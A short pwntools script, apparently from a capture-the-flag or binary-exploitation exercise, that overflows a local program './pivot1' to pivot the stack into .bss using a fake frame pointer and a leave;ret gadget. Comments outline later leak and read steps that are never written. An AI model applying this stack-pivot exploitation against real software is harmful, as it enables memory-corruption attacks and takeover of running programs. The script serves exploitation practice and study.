from pwn import *

p = process("./pivot1")
bss = 0x00601000 + 0x400
read_got = 0x600fe8
ret_leave = 0x00400573
# rbp  = bss
payload = b'A'*0x10
payload += p64(bss + 0x10)
payload += p64(ret_leave)

pause()
p.sendline(payload)
# puts(read)

# read(0, bss, )




p.interactive()
